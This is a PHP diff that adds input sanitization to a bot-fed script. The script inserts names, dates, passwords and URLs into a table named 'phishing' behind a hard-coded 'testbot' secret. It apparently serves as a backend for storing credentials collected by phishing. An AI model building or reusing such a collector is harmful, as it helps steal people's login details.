@@ -3,6 +3,7 @@
 header('Content-type: text/html; charset="utf-8"',true);
 
 require "../helper/class.crud.php";
+require "../helper/secure_validation.php";
 
 //change this use key of your bot
 $secret_code="testbot";
@@ -18,10 +19,10 @@ if($_POST['secret_code']==$secret_code)
 
 	$values = array(
 		array(
-                  'name'=>"$name", 
-                  'date'=>"$date", 
-                  'password'=>"$password", 
-                  'url'=>"$url"
+                  'name'=>sanitizecmd(sanitize($name)), 
+                  'date'=>sanitizecmd(sanitize($date)), 
+                  'password'=>sanitizecmd(sanitize($password)), 
+                  'url'=>sanitizecmd(sanitize($url))
                  )
                 );
 	$crud->dbInsert('phishing', $values);
